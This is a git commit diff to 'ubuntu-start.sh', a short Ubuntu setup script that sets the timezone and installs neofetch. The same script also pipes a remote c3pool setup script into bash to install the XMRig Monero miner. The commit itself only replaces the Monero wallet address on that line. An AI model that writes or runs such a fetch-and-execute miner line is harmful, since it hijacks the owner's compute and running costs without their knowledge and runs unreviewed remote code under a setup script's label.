fd8733bc1e7692584fb21048194affb776d9747b
sureshamithu <103202431+sureshamithu@users.noreply.github.com>
2022-04-08 02:01:10 +0530

    Update ubuntu-start.sh

--- ubuntu-start.sh
+++ ubuntu-start.sh
@@ -8,5 +8,5 @@ sudo timedatectl set-timezone "Asia/Shanghai"
 # Install the tools you need to use
 sudo apt update
 sudo apt install -y neofetch
-curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 84ketbfbRx9Qb49mJzjdcbYKtFnwUW2Nc63wdxLzcSdYgQkWeMJmmuFefjmSw6zpJAAa66gGuSmh6e4fcCHqmmE82NSN8iN
+curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4Ar2VgH4GAa9un28s4oeuDd6YNvS6bhFCiQgPfaxRL2nTck7v2ajtDTPTVGJd8in6rWZd3u3FDzKDfauD3rYfWkVAEmfgvX
 #sudo -i
